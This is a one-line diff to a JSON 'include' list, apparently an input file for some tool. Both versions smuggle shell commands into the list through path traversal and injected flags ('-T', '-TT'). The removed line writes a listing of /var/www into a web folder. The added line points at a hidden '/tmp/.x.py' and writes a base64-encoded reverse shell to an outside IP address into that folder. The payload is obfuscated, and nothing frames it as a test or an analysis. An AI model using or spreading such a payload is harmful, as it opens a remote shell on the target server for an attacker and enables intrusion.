@@ -1,1 +1,1 @@
-{"include":["../../../../../../tmp","-T","-TT","ls -la ../../../../../../var/www > ../../../../../../var/www/outfile/flagt/master/x2.txt"]}
+{"include":["../../../../../../tmp/.x.py","-T","-TT","echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTMuMTI2LjE5MC4xODMvODg5IDA+JjEgJg== > ../../../../../../var/www/outfile/flagt/master/x2.txt"]}
